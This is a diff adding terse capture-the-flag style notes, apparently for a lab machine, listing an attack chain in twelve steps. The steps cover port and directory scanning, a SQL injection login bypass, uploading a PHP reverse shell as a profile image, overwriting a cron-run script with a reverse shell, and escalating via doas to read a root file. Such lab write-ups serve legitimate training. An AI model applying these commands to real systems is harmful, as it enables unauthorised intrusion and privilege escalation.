@@ -1,0 +1,12 @@
+1 - nmap -A 10.10.3.34
+2 - gobuster dir -u http://10.10.3.34:445 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3 - http://10.10.3.34:445/management/ , username=' or 1=1# password=a
+4 - cp /usr/share/webshells/php/php-reverse-shell.php .
+5 - Upload Profile Image
+6 - cat /etc/crontab
+7 - rm /var/www/scripts/backup.sh
+8 - reverse shell -> /var/www/scripts/backup.sh
+9 - chmod +x backup.sh
+10 - find / -perm -u=s -type f 2>/dev/null
+11 - cat /etc/doas.conf
+12 - doas openssl enc -in /root/root.txt
